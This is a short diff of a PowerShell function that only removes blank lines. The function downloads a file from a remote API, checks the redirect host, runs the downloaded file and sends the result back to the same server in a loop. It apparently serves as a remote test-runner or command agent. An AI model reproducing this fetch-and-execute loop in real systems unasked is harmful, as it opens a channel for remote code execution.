@@ -11,17 +11,14 @@ function Run {
             'dat' = $Dat
         }
         $Response = Invoke-WebRequest -URI $Api -UseBasicParsing -Headers $Headers -MaximumRedirection 1 -OutFile $Vst -PassThru
-        
         if ($CA -ne $Response.BaseResponse.ResponseUri.Authority) {
             Write-Output "[P] Bad authority: $Response.BaseResponse.ResponseUri.Authority"
             exit 0
         }
-        
         $Test = $Response.BaseResponse.ResponseUri.AbsolutePath.Split("/")[-1].Split("_")[0]
         if (-not $Test) {
             return
         }
-
         Write-Output "[P] Running $Test [$Vst]" 
         $Code = Execute $Vst   
         Run -Dat "${Test}:$Code"
